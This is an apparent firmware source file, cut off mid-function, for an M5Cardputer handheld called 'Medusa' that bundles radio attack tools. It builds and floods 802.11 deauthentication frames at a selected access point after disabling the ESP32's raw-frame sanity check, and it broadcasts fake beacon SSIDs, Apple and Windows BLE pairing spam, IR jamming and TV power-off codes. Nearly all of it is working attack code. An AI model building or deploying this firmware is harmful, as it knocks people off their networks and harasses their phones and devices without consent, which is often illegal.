#include <M5Cardputer.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <NimBLEDevice.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_sleep.h>
#include <Preferences.h>
#include <algorithm>
#include <vector>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

#define IR_TX_PIN 44
#define SCREEN_W  240
#define SCREEN_H  135

#define BG_COLOR     0x0000
#define PANEL_COLOR  0x001F
#define ACCENT_COLOR 0x07FF
#define TEXT_COLOR   0xFFFF
#define DIM_COLOR    0x8410

#define BRIGHT_MIN 10
#define BRIGHT_MAX 255
#define BRIGHT_STEP 15
#define BRIGHT_DEFAULT 128

IRsend irsend(IR_TX_PIN);
Preferences prefs;

uint8_t currentBrightness = BRIGHT_DEFAULT;

enum Screen {
    MAIN_MENU, POWER_MENU, IR_MENU, WIFI_MENU, BLE_MENU, SETTINGS_MENU,
    WIFI_SCAN, BLE_RUN, IR_JAM_CONFIG, IR_JAM_RUN, DEAUTH_RUN, PROJECTOR_MENU,
    BEACON_SPAM_RUN
};
Screen currentScreen = MAIN_MENU;
int menuIndex = 0;
int scanIndex = 0;
bool needsRedraw = true;

struct WiFiNetwork {
    String ssid;
    uint8_t bssid[6];
    int channel;
    int rssi;
};
std::vector<WiFiNetwork> networks;
bool wifiScanInProgress = false;

bool deauthRunning = false;
uint8_t deauthFrame[26];
uint8_t targetBSSID[6];
int targetChannel = 1;
unsigned long deauthLastSend = 0;
unsigned long deauthLastDisplay = 0;
uint32_t deauthFrameCount = 0;
bool deauthApStarted = false;

bool beaconSpamRunning = false;
unsigned long lastBeaconTime = 0;
unsigned long beaconLastDisplay = 0;
uint32_t beaconPacketCount = 0;
int currentSSIDIdx = 0;

const char* fakeSSIDs[] = {
    "lol", "ez", "lmao", "Free WiFi", "Get Rekt", 
    "404 Network", "FBI Van", "Virus.exe", "Medusa", 
    "Drop it like it's hot", "Tell my WiFi love her"
};
const int numFakeSSIDs = sizeof(fakeSSIDs) / sizeof(fakeSSIDs[0]);

bool bleSpamRunning = false;
bool bleAppleJuice = true;
unsigned long lastBlePacket = 0;
NimBLEAdvertising *pAdvertising = nullptr;
uint32_t blePacketCount = 0;
unsigned long bleLastDisplay = 0;

enum JamMode { JAM_BASIC, JAM_ENHANCED, JAM_SWEEP, JAM_RANDOM, JAM_EMPTY };
const char* JAM_MODE_NAMES[] = {"BASIC", "ENHANCED", "SWEEP", "RANDOM", "EMPTY"};

struct IRJammerState {
    JamMode  jamMode     = JAM_SWEEP;
    uint8_t  freqIdx     = 3;
    int      markTiming  = 12;
    int      spaceTiming = 12;
    uint16_t pattern[20];
    uint16_t randomPattern[30];
    unsigned long lastSend    = 0;
    unsigned long lastDisplay = 0;
    uint32_t jamCount = 0;
    int sweepDir = 1;
    bool forceDisplay = false;
} irJam;

const uint16_t IR_FREQS[] = {30000, 33000, 36000, 38000, 40000, 42000, 56000};
const int NUM_IR_FREQS = 7;

void drawBatteryStatus();
void drawCurrentScreen();
void drawMenu(const char *title, const char *items[], int itemCount);
void drawWiFiScan();
int  getItemCount();
bool isMenuScreen();
void handleMainMenu();
void handlePowerMenu();
void handleIRMenu();
void handleWiFiMenu();
void handleBLEMenu();
void startTVBGone();
void startIRJammer(JamMode mode);
void runIRJammer();
void startWiFiScan();
void checkWifiScan();
void startTargetDeauth(int index);
void runDeauth();
void stopDeauth();
void startBeaconSpam();
void runBeaconSpam();
void stopBeaconSpam();
void startBLESpam(bool apple);
void runBLESpam();
void stopBLESpam();
void goToDeepSleep();
void sendProjectorCode(int action);

void setup() {
    Serial.begin(115200);
    auto cfg = M5.config();
    M5Cardputer.begin(cfg, true);
    M5Cardputer.Display.setRotation(1);
    M5Cardputer.Display.fillScreen(BG_COLOR);
    M5Cardputer.Display.setTextColor(TEXT_COLOR, BG_COLOR);
    M5Cardputer.Display.setTextSize(1);
    irsend.begin();
    pinMode(IR_TX_PIN, OUTPUT);
    digitalWrite(IR_TX_PIN, LOW);
    randomSeed(millis());

    prefs.begin("medusa", false);
    currentBrightness = prefs.getUChar("brightness", BRIGHT_DEFAULT);
    if (currentBrightness < BRIGHT_MIN) currentBrightness = BRIGHT_MIN;
    M5Cardputer.Display.setBrightness(currentBrightness);

    needsRedraw = true;
}

void loop() {
    M5Cardputer.update();
    bool changed = false;

    if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
        bool up   = std::find(status.word.begin(), status.word.end(), ';') != status.word.end();
        bool down = std::find(status.word.begin(), status.word.end(), '.') != status.word.end();
        bool back = std::find(status.word.begin(), status.word.end(), '`') != status.word.end();

        if (currentScreen == WIFI_SCAN) {
            int n = (int)networks.size();
            if (n > 0) {
                if (up)   { scanIndex--; if (scanIndex < 0) scanIndex = n - 1; changed = true; }
                if (down) { scanIndex++; if (scanIndex >= n) scanIndex = 0; changed = true; }
            }
        } else if (currentScreen == IR_JAM_RUN) {
            if (up)   { irJam.freqIdx = (irJam.freqIdx + 1) % NUM_IR_FREQS; irJam.forceDisplay = true; }
            if (down) { irJam.freqIdx = (irJam.freqIdx + NUM_IR_FREQS - 1) % NUM_IR_FREQS; irJam.forceDisplay = true; }
        } else if (currentScreen == SETTINGS_MENU) {
            if (up) {
                int v = (int)currentBrightness + BRIGHT_STEP;
                if (v > BRIGHT_MAX) v = BRIGHT_MAX;
                currentBrightness = (uint8_t)v;
                M5Cardputer.Display.setBrightness(currentBrightness);
                changed = true;
            }
            if (down) {
                int v = (int)currentBrightness - BRIGHT_STEP;
                if (v < BRIGHT_MIN) v = BRIGHT_MIN;
                currentBrightness = (uint8_t)v;
                M5Cardputer.Display.setBrightness(currentBrightness);
                changed = true;
            }
        } else if (isMenuScreen()) {
            int count = getItemCount();
            if (count > 0) {
                if (up)   { menuIndex--; if (menuIndex < 0) menuIndex = count - 1; changed = true; }
                if (down) { menuIndex++; if (menuIndex >= count) menuIndex = 0; changed = true; }
            }
        }

        if (back) {
            if (currentScreen == SETTINGS_MENU) {
                prefs.putUChar("brightness", currentBrightness);
                currentScreen = MAIN_MENU; menuIndex = 0; changed = true;
            } else if (currentScreen == IR_JAM_RUN) {
                digitalWrite(IR_TX_PIN, LOW);
                currentScreen = IR_JAM_CONFIG; menuIndex = (int)irJam.jamMode; changed = true;
            } else if (currentScreen == IR_JAM_CONFIG) {
                currentScreen = IR_MENU; menuIndex = 0; changed = true;
            } else if (currentScreen == DEAUTH_RUN) {
                stopDeauth();
                currentScreen = WIFI_MENU; menuIndex = 0; changed = true;
            } else if (currentScreen == BEACON_SPAM_RUN) {
                stopBeaconSpam();
                currentScreen = WIFI_MENU; menuIndex = 0; changed = true;
            } else if (currentScreen == BLE_RUN) {
                stopBLESpam();
                currentScreen = BLE_MENU; menuIndex = 0; changed = true;
            } else if (currentScreen == WIFI_SCAN) {
                WiFi.scanDelete();
                wifiScanInProgress = false;
                WiFi.mode(WIFI_OFF);
                currentScreen = WIFI_MENU; menuIndex = 0; changed = true;
            } else if (currentScreen == PROJECTOR_MENU) {
                currentScreen = IR_MENU; menuIndex = 0; changed = true;
            } else if (currentScreen != MAIN_MENU) {
                currentScreen = MAIN_MENU; menuIndex = 0; changed = true;
            }
        } else if (status.enter) {
            if (currentScreen == MAIN_MENU)         handleMainMenu();
            else if (currentScreen == POWER_MENU)   handlePowerMenu();
            else if (currentScreen == IR_MENU)      handleIRMenu();
            else if (currentScreen == WIFI_MENU)    handleWiFiMenu();
            else if (currentScreen == BLE_MENU)     handleBLEMenu();
            else if (currentScreen == WIFI_SCAN)    startTargetDeauth(scanIndex);
            else if (currentScreen == IR_JAM_CONFIG) {
                startIRJammer((JamMode)menuIndex);
                currentScreen = IR_JAM_RUN;
            } else if (currentScreen == PROJECTOR_MENU) {
                if (menuIndex == 4) {
                    currentScreen = IR_MENU;
                    menuIndex = 0;
                } else {
                    sendProjectorCode(menuIndex);
                }
            }
            changed = true;
        }
    }

    if (changed) needsRedraw = true;

    if (needsRedraw) {
        M5Cardputer.Display.fillScreen(BG_COLOR);
        drawBatteryStatus();
        drawCurrentScreen();
        needsRedraw = false;
    }

    if (currentScreen == BLE_RUN && bleSpamRunning)         runBLESpam();
    if (currentScreen == IR_JAM_RUN)                        runIRJammer();
    if (currentScreen == DEAUTH_RUN && deauthRunning)       runDeauth();
    if (currentScreen == BEACON_SPAM_RUN && beaconSpamRunning) runBeaconSpam();
    if (currentScreen == WIFI_SCAN && wifiScanInProgress)   checkWifiScan();

    delay(5);
}

void drawBatteryStatus() {
    M5Cardputer.Display.fillRect(0, 0, SCREEN_W, 16, PANEL_COLOR);
    M5Cardputer.Display.setTextColor(TEXT_COLOR, PANEL_COLOR);
    M5Cardputer.Display.setCursor(4, 2);
    M5Cardputer.Display.print("Medusa");

    int bat = M5.Power.getBatteryLevel();
    if (bat < 0) bat = 0;
    M5Cardputer.Display.setCursor(SCREEN_W - 50, 2);
    M5Cardputer.Display.print(String(bat) + "%");

    int iconX = SCREEN_W - 18, iconY = 3;
    M5Cardputer.Display.drawRect(iconX, iconY, 12, 8, TEXT_COLOR);
    M5Cardputer.Display.fillRect(iconX + 1, iconY + 1, (bat * 10) / 100, 6, ACCENT_COLOR);
}

void drawMenu(const char *title, const char *items[], int itemCount) {
    if (itemCount <= 0) return;
    if (menuIndex < 0) menuIndex = itemCount - 1;
    if (menuIndex >= itemCount) menuIndex = 0;

    M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
    M5Cardputer.Display.setCursor(10, 22);
    M5Cardputer.Display.print(title);
    M5Cardputer.Display.drawFastHLine(10, 32, SCREEN_W - 20, ACCENT_COLOR);

    for (int i = 0; i < itemCount; i++) {
        int y = 38 + i * 14;
        if (i == menuIndex) {
            M5Cardputer.Display.fillRect(8, y - 2, SCREEN_W - 16, 14, ACCENT_COLOR);
            M5Cardputer.Display.setTextColor(BG_COLOR, ACCENT_COLOR);
        } else {
            M5Cardputer.Display.setTextColor(TEXT_COLOR, BG_COLOR);
        }
        M5Cardputer.Display.setCursor(12, y);
        M5Cardputer.Display.print(items[i]);
    }
}

void drawWiFiScan() {
    M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
    M5Cardputer.Display.setCursor(10, 22);
    if (wifiScanInProgress) {
        M5Cardputer.Display.print("Scanning...");
        return;
    }
    M5Cardputer.Display.print("Select target (" + String(networks.size()) + ")");
    M5Cardputer.Display.drawFastHLine(10, 32, SCREEN_W - 20, ACCENT_COLOR);

    int total = (int)networks.size();
    if (total == 0) {
        M5Cardputer.Display.setTextColor(DIM_COLOR, BG_COLOR);
        M5Cardputer.Display.setCursor(12, 40);
        M5Cardputer.Display.print("No networks found");
        return;
    }
    if (scanIndex >= total) scanIndex = 0;

    for (int i = 0; i < total && i < 7; i++) {
        int y = 38 + i * 12;
        if (i == scanIndex) {
            M5Cardputer.Display.fillRect(8, y - 2, SCREEN_W - 16, 12, ACCENT_COLOR);
            M5Cardputer.Display.setTextColor(BG_COLOR, ACCENT_COLOR);
        } else {
            M5Cardputer.Display.setTextColor(TEXT_COLOR, BG_COLOR);
        }
        M5Cardputer.Display.setCursor(12, y);
        String name = networks[i].ssid.length() ? networks[i].ssid : String("<hidden>");
        M5Cardputer.Display.print(name.substring(0, 14));
        M5Cardputer.Display.setCursor(SCREEN_W - 40, y);
        M5Cardputer.Display.print("CH" + String(networks[i].channel));
    }
}

void drawCurrentScreen() {
    switch (currentScreen) {
        case MAIN_MENU: {
            const char* items[] = {"Power", "IR", "Wi-Fi", "BLE", "Settings"};
            drawMenu("Medusa", items, 5); break;
        }
        case POWER_MENU: {
            const char* items[] = {"Deep Sleep", "Restart", "Power Off"};
            drawMenu("Power", items, 3); break;
        }
        case IR_MENU: {
            const char* items[] = {"TV-B-Gone", "IR Jammer", "Projector"};
            drawMenu("IR", items, 3); break;
        }
        case IR_JAM_CONFIG: {
            const char* items[] = {"BASIC", "ENHANCED", "SWEEP", "RANDOM", "EMPTY"};
            drawMenu("Jammer Mode", items, 5);
            M5Cardputer.Display.setTextColor(DIM_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, SCREEN_H - 12);
            M5Cardputer.Display.print("Enter=start  `=back");
            break;
        }
        case PROJECTOR_MENU: {
            const char* items[] = {"Power", "Vol+", "Vol-", "Mute", "Back"};
            drawMenu("Projector", items, 5);
            M5Cardputer.Display.setTextColor(DIM_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, SCREEN_H - 12);
            M5Cardputer.Display.print("Enter=send  `=back");
            break;
        }
        case WIFI_MENU: {
            const char* items[] = {"Scan & Target Deauth", "Beacon Spam"};
            drawMenu("Wi-Fi", items, 2); break;
        }
        case BLE_MENU: {
            const char* items[] = {"AppleJuice (iOS)", "SwiftPair (Windows)"};
            drawMenu("BLE Spam", items, 2); break;
        }
        case SETTINGS_MENU: {
            M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, 22);
            M5Cardputer.Display.print("Settings");
            M5Cardputer.Display.drawFastHLine(10, 32, SCREEN_W - 20, ACCENT_COLOR);

            M5Cardputer.Display.setTextColor(TEXT_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(12, 42);
            M5Cardputer.Display.print("Brightness: " + String(currentBrightness));

            int barX = 12, barY = 60, barW = SCREEN_W - 24, barH = 12;
            M5Cardputer.Display.drawRect(barX, barY, barW, barH, TEXT_COLOR);
            int fillW = ((int)currentBrightness * (barW - 2)) / BRIGHT_MAX;
            M5Cardputer.Display.fillRect(barX + 1, barY + 1, fillW, barH - 2, ACCENT_COLOR);

            M5Cardputer.Display.setTextColor(DIM_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, SCREEN_H - 25);
            M5Cardputer.Display.print(";/. change");
            M5Cardputer.Display.setCursor(10, SCREEN_H - 12);
            M5Cardputer.Display.print("` save & back");
            break;
        }
        case WIFI_SCAN: {
            drawWiFiScan(); break;
        }
        case IR_JAM_RUN: {
            M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, 22);
            M5Cardputer.Display.print("IR Jammer: ");
            M5Cardputer.Display.print(JAM_MODE_NAMES[irJam.jamMode]);
            M5Cardputer.Display.drawFastHLine(10, 32, SCREEN_W - 20, ACCENT_COLOR);
            M5Cardputer.Display.setTextColor(TEXT_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, 42);
            M5Cardputer.Display.print("Jamming...");
            M5Cardputer.Display.setTextColor(DIM_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, SCREEN_H - 25);
            M5Cardputer.Display.print(";/. change freq");
            M5Cardputer.Display.setCursor(10, SCREEN_H - 12);
            M5Cardputer.Display.print("` to stop");
            break;
        }
        case DEAUTH_RUN: {
            M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, 22);
            M5Cardputer.Display.print("Target Deauth");
            M5Cardputer.Display.drawFastHLine(10, 32, SCREEN_W - 20, ACCENT_COLOR);
            M5Cardputer.Display.setTextColor(TEXT_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, 40);
            M5Cardputer.Display.print(String(networks[scanIndex].ssid).substring(0, 16));
            M5Cardputer.Display.setCursor(10, 52);
            M5Cardputer.Display.print("Ch: " + String(targetChannel));
            M5Cardputer.Display.setTextColor(DIM_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, SCREEN_H - 12);
            M5Cardputer.Display.print("` to stop");
            break;
        }
        case BEACON_SPAM_RUN: {
            M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, 22);
            M5Cardputer.Display.print("Beacon Spam");
            M5Cardputer.Display.drawFastHLine(10, 32, SCREEN_W - 20, ACCENT_COLOR);
            M5Cardputer.Display.setTextColor(TEXT_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, 42);
            M5Cardputer.Display.print("Spamming...");
            M5Cardputer.Display.setTextColor(DIM_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, SCREEN_H - 12);
            M5Cardputer.Display.print("` to stop");
            break;
        }
        case BLE_RUN: {
            M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, 22);
            M5Cardputer.Display.print(bleAppleJuice ? "AppleJuice" : "SwiftPair");
            M5Cardputer.Display.drawFastHLine(10, 32, SCREEN_W - 20, ACCENT_COLOR);
            M5Cardputer.Display.setTextColor(TEXT_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, 40);
            M5Cardputer.Display.print("Spamming BLE...");
            M5Cardputer.Display.setTextColor(DIM_COLOR, BG_COLOR);
            M5Cardputer.Display.setCursor(10, SCREEN_H - 12);
            M5Cardputer.Display.print("` to stop");
            break;
        }
    }
}

bool isMenuScreen() {
    return currentScreen == MAIN_MENU   || currentScreen == POWER_MENU ||
           currentScreen == IR_MENU     || currentScreen == WIFI_MENU  ||
           currentScreen == BLE_MENU    || currentScreen == IR_JAM_CONFIG ||
           currentScreen == PROJECTOR_MENU;
}

int getItemCount() {
    switch (currentScreen) {
        case MAIN_MENU:      return 5;
        case POWER_MENU:     return 3;
        case IR_MENU:        return 3;
        case WIFI_MENU:      return 2;
        case BLE_MENU:       return 2;
        case IR_JAM_CONFIG:  return 5;
        case PROJECTOR_MENU: return 5;
        default:             return 1;
    }
}

void handleMainMenu() {
    if (menuIndex == 0)      currentScreen = POWER_MENU;
    else if (menuIndex == 1) currentScreen = IR_MENU;
    else if (menuIndex == 2) currentScreen = WIFI_MENU;
    else if (menuIndex == 3) currentScreen = BLE_MENU;
    else if (menuIndex == 4) currentScreen = SETTINGS_MENU;
    menuIndex = 0;
}
void handlePowerMenu() {
    if (menuIndex == 0)      goToDeepSleep();
    else if (menuIndex == 1) ESP.restart();
    else if (menuIndex == 2) M5.Power.powerOff();
    menuIndex = 0;
}
void handleIRMenu() {
    if (menuIndex == 0)      startTVBGone();
    else if (menuIndex == 1) { currentScreen = IR_JAM_CONFIG; menuIndex = (int)irJam.jamMode; }
    else if (menuIndex == 2) { currentScreen = PROJECTOR_MENU; menuIndex = 0; }
}
void handleWiFiMenu() {
    if (menuIndex == 0) {
        currentScreen = WIFI_SCAN;
        startWiFiScan();
    } else if (menuIndex == 1) {
        startBeaconSpam();
    }
}
void handleBLEMenu() {
    bleAppleJuice = (menuIndex == 0);
    startBLESpam(bleAppleJuice);
    currentScreen = BLE_RUN;
}

void goToDeepSleep() {
    M5Cardputer.Display.fillScreen(BG_COLOR);
    M5Cardputer.Display.setTextColor(TEXT_COLOR, BG_COLOR);
    M5Cardputer.Display.setCursor(10, 50);
    M5Cardputer.Display.print("Deep Sleep...");
    delay(500);
    M5.Power.deepSleep();
}

void startTVBGone() {
    M5Cardputer.Display.fillScreen(BG_COLOR);
    M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
    M5Cardputer.Display.setCursor(10, 40);
    M5Cardputer.Display.print("TV-B-Gone...");
    uint32_t powerCodes[] = {0x20DF10EF, 0xE0E040BF, 0x10EF, 0x48B7, 0x00FF};
    for (int i = 0; i < 5; i++) {
        irsend.sendNEC(powerCodes[i], 32);
        delay(20);
    }
    needsRedraw = true;
    currentScreen = IR_MENU;
    menuIndex = 0;
}

void startIRJammer(JamMode mode) {
    irJam.jamMode     = mode;
    irJam.markTiming  = 12;
    irJam.spaceTiming = 12;
    irJam.sweepDir    = 1;
    irJam.jamCount    = 0;
    irJam.lastSend    = 0;
    irJam.lastDisplay = 0;
    irJam.forceDisplay = true;
    for (int i = 0; i < 20; i += 2) {
        irJam.pattern[i]     = irJam.markTiming;
        irJam.pattern[i + 1] = irJam.spaceTiming;
    }
    for (int i = 0; i < 30; i++) irJam.randomPattern[i] = random(5, 1000);
    needsRedraw = true;
}

void runIRJammer() {
    if (millis() - irJam.lastSend < 15) return;
    irJam.lastSend = millis();

    uint16_t freq = IR_FREQS[irJam.freqIdx];

    switch (irJam.jamMode) {
        case JAM_BASIC: {
            for (int i = 0; i < 25; i++) {
                digitalWrite(IR_TX_PIN, HIGH); delayMicroseconds(12);
                digitalWrite(IR_TX_PIN, LOW);  delayMicroseconds(12);
            }
            uint16_t p[20];
            for (int i = 0; i < 20; i += 2) { p[i] = 12; p[i + 1] = 12; }
            irsend.sendRaw(p, 20, freq / 1000);
            break;
        }
        case JAM_ENHANCED: {
            for (int i = 0; i < 25; i++) {
                digitalWrite(IR_TX_PIN, HIGH); delayMicroseconds(12);
                digitalWrite(IR_TX_PIN, LOW);  delayMicroseconds(30);
            }
            uint16_t p[20];
            for (int i = 0; i < 20; i += 2) { p[i] = 12; p[i + 1] = 30; }
            irsend.sendRaw(p, 20, freq / 1000);
            break;
        }
        case JAM_SWEEP: {
            irJam.markTiming += irJam.sweepDir;
            if (irJam.markTiming > 70) irJam.sweepDir = -1;
            if (irJam.markTiming < 8)  irJam.sweepDir =  1;
            for (int i = 0; i < 20; i += 2) {
                irJam.pattern[i]     = irJam.markTiming;
                irJam.pattern[i + 1] = irJam.markTiming;
            }
            for (int i = 0; i < 20; i++) {
                digitalWrite(IR_TX_PIN, HIGH); delayMicroseconds(irJam.markTiming);
                digitalWrite(IR_TX_PIN, LOW);  delayMicroseconds(irJam.markTiming);
            }
            irsend.sendRaw(irJam.pattern, 20, freq / 1000);
            break;
        }
        case JAM_RANDOM: {
            for (int i = 0; i < 30; i++) irJam.randomPattern[i] = random(5, 1000);
            irsend.sendRaw(irJam.randomPattern, 30, freq / 1000);
            for (int i = 0; i < 10; i++) {
                digitalWrite(IR_TX_PIN, HIGH); delayMicroseconds(random(5, 100));
                digitalWrite(IR_TX_PIN, LOW);  delayMicroseconds(random(5, 100));
            }
            break;
        }
        case JAM_EMPTY: {
            uint16_t empty[4] = {80, 80, 80, 80};
            for (int i = 0; i < 3; i++) irsend.sendRaw(empty, 4, freq / 1000);
            break;
        }
    }

    irJam.jamCount++;

    if ((irJam.jamMode == JAM_SWEEP || irJam.jamMode == JAM_RANDOM) && irJam.jamCount % 30 == 0) {
        irJam.freqIdx = (irJam.freqIdx + 1) % NUM_IR_FREQS;
        irJam.forceDisplay = true;
    }

    if (millis() - irJam.lastDisplay > 500 || irJam.forceDisplay) {
        irJam.lastDisplay = millis();
        irJam.forceDisplay = false;
        M5Cardputer.Display.fillRect(10, 52, 220, 55, BG_COLOR);
        M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
        M5Cardputer.Display.setCursor(10, 55);
        M5Cardputer.Display.print("Jams: " + String(irJam.jamCount));
        M5Cardputer.Display.setCursor(10, 70);
        M5Cardputer.Display.print("Freq: " + String(freq / 1000) + " kHz");
        M5Cardputer.Display.setCursor(10, 85);
        M5Cardputer.Display.print("Mode: " + String(JAM_MODE_NAMES[irJam.jamMode]));
    }
}

void startWiFiScan() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    networks.clear();
    scanIndex = 0;
    WiFi.scanNetworks(true, false);
    wifiScanInProgress = true;
    needsRedraw = true;
}

void checkWifiScan() {
    int n = WiFi.scanComplete();
    if (n == WIFI_SCAN_RUNNING) return;
    networks.clear();
    if (n > 0) {
        for (int i = 0; i < n && i < 8; i++) {
            WiFiNetwork net;
            net.ssid = WiFi.SSID(i);
            memcpy(net.bssid, WiFi.BSSID(i), 6);
            net.channel = WiFi.channel(i);
            net.rssi    = WiFi.RSSI(i);
            networks.push_back(net);
        }
    }
    WiFi.scanDelete();
    wifiScanInProgress = false;
    scanIndex = 0;
    needsRedraw = true;
}

void startTargetDeauth(int index) {
    if (index < 0 || index >= (int)networks.size()) return;
    memcpy(targetBSSID, networks[index].bssid, 6);
    targetChannel = networks[index].channel;

    WiFi.disconnect();
    delay(50);
    WiFi.mode(WIFI_AP);
    delay(100);

    String apSsid = "Medusa_" + String(random(1000, 9999));
    bool ok = WiFi.softAP(apSsid.c_str(), nullptr, targetChannel, 0, 4, false);
    delay(150);
    if (!ok) {
        WiFi.mode(WIFI_OFF);
        currentScreen = WIFI_MENU;
        needsRedraw = true;
        return;
    }
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    delay(50);

    memset(deauthFrame, 0, sizeof(deauthFrame));
    deauthFrame[0] = 0xC0; deauthFrame[1] = 0x00;
    deauthFrame[2] = 0x3A; deauthFrame[3] = 0x01;
    memset(&deauthFrame[4], 0xFF, 6);
    memcpy(&deauthFrame[10], targetBSSID, 6);
    memcpy(&deauthFrame[16], targetBSSID, 6);
    deauthFrame[24] = 0x07;
    deauthFrame[25] = 0x00;

    deauthRunning = true;
    deauthApStarted = true;
    deauthFrameCount = 0;
    deauthLastSend = 0;
    deauthLastDisplay = 0;
    currentScreen = DEAUTH_RUN;
    needsRedraw = true;
}

void runDeauth() {
    if (millis() - deauthLastSend < 5) return;
    deauthLastSend = millis();
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    if (err == ESP_OK) deauthFrameCount++;

    if (millis() - deauthLastDisplay > 500) {
        deauthLastDisplay = millis();
        M5Cardputer.Display.fillRect(10, 68, 220, 30, BG_COLOR);
        M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
        M5Cardputer.Display.setCursor(10, 68);
        M5Cardputer.Display.print("Frames: " + String(deauthFrameCount));
        M5Cardputer.Display.setCursor(10, 82);
        M5Cardputer.Display.print("Ch: " + String(targetChannel));
    }
}

void stopDeauth() {
    deauthRunning = false;
    if (deauthApStarted) {
        WiFi.softAPdisconnect(true);
        deauthApStarted = false;
    }
    WiFi.mode(WIFI_OFF);
    delay(50);
}

void startBeaconSpam() {
    WiFi.disconnect();
    delay(50);
    WiFi.mode(WIFI_AP);
    delay(100);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    
    beaconSpamRunning = true;
    beaconPacketCount = 0;
    lastBeaconTime = 0;
    beaconLastDisplay = 0;
    currentSSIDIdx = 0;
    
    currentScreen = BEACON_SPAM_RUN;
    needsRedraw = true;
}

void runBeaconSpam() {
    if (!beaconSpamRunning) return;
    if (millis() - lastBeaconTime < 20) return;
    lastBeaconTime = millis();

    uint8_t frame[128] = {
        0x80, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x64, 0x00,
        0x31, 0x04,
        0x00,
        0x00
    };

    for (int i = 10; i <= 15; i++) frame[i] = random(256);
    frame[10] &= 0xFE;
    frame[10] |= 0x02;
    for (int i = 16; i <= 21; i++) frame[i] = frame[10 + (i - 16)];

    const char* ssid = fakeSSIDs[currentSSIDIdx];
    int len = strlen(ssid);
    if (len > 32) len = 32;
    frame[37] = len;
    memcpy(&frame[38], ssid, len);

    int offset = 38 + len;
    frame[offset++] = 0x01;
    frame[offset++] = 0x08;
    frame[offset++] = 0x82; frame[offset++] = 0x84; frame[offset++] = 0x8b; frame[offset++] = 0x96;
    frame[offset++] = 0x0c; frame[offset++] = 0x12; frame[offset++] = 0x18; frame[offset++] = 0x24;
    frame[offset++] = 0x03;
    frame[offset++] = 0x01;
    frame[offset++] = 0x01;

    esp_wifi_80211_tx(WIFI_IF_AP, frame, offset, false);

    currentSSIDIdx = (currentSSIDIdx + 1) % numFakeSSIDs;
    beaconPacketCount++;

    if (millis() - beaconLastDisplay > 500) {
        beaconLastDisplay = millis();
        M5Cardputer.Display.fillRect(10, 55, 220, 35, BG_COLOR);
        M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
        M5Cardputer.Display.setCursor(10, 55);
        M5Cardputer.Display.print("Packets: " + String(beaconPacketCount));
        M5Cardputer.Display.setCursor(10, 70);
        M5Cardputer.Display.print("SSID: " + String(fakeSSIDs[currentSSIDIdx]));
    }
}

void stopBeaconSpam() {
    beaconSpamRunning = false;
    WiFi.mode(WIFI_OFF);
    delay(50);
}

void startBLESpam(bool apple) {
    NimBLEDevice::init(apple ? "AppleJuice" : "SwiftPair");
    pAdvertising = NimBLEDevice::getAdvertising();
    bleSpamRunning = true;
    blePacketCount = 0;
    lastBlePacket = 0;
    bleLastDisplay = 0;
}

void runBLESpam() {
    if (!bleSpamRunning) return;
    if (millis() - lastBlePacket < 50) return;
    lastBlePacket = millis();

    NimBLEAdvertisementData advData;
    if (bleAppleJuice) {
        uint8_t applePayload[17] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x00, 0x00, 0x00,
                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        advData.addData(applePayload, 17);
    } else {
        advData.setName("SwiftPair Device");
        uint8_t swiftData[] = {0x06, 0x00, 0x03, 0x03, 0x00, 0x00};
        advData.setManufacturerData(swiftData, 6);
    }
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    delay(5);
    pAdvertising->stop();
    blePacketCount++;

    if (millis() - bleLastDisplay > 500) {
        bleLastDisplay = millis();
        M5Cardputer.Display.fillRect(10, 55, 220, 20, BG_COLOR);
        M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
        M5Cardputer.Display.setCursor(10, 55);
        M5Cardputer.Display.print("Packets: " + String(blePacketCount));
    }
}

void stopBLESpam() {
    bleSpamRunning = false;
    if (pAdvertising) {
        pAdvertising->stop();
        pAdvertising = nullptr;
